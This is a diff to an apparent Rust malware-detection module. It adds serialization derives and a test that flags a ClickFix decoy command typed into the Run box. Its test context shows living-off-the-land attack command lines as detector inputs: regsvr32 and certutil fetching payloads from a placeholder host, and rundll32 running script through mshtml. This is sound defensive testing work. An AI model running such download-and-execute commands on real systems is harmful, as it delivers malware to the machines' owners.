@@ -9,18 +9,19 @@
 //! by the Stealer check (start-up entries, tasks, services) and real-time
 //! protection (programs as they start, commands typed into the Run box).
 
+use serde::{Deserialize, Serialize};
 use std::path::Path;
 
 /// How sure a match is. `High` is the pattern itself (download and run,
 /// switching off Defender); `Medium` is common in attacks but also in
 /// legitimate admin tools (an encoded command, a hidden window).
-#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
 pub enum Confidence {
     Medium,
     High,
 }
 
-#[derive(Debug, Clone, PartialEq, Eq)]
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct Match {
     /// Stable rule id, e.g. `powershell.download-run`.
     pub rule: String,
@@ -356,6 +357,8 @@ mod tests {
         assert_eq!(rules("regsvr32", "/s /n /u /i:http://x.test/a.sct scrobj.dll"), ["regsvr32.remote"]);
         assert_eq!(rules("rundll32", r#"javascript:"\..\mshtml,RunHTMLApplication ";alert(1)"#), ["rundll32.script"]);
         assert_eq!(rules("certutil", "-urlcache -split -f http://x.test/a.exe a.exe"), ["certutil.download"]);
+        // The harmless check typed into Win+R to test the service by hand.
+        assert_eq!(rules("cmd", "/c rem verify you are human"), ["clickfix.decoy"]);
     }
 
     #[test]
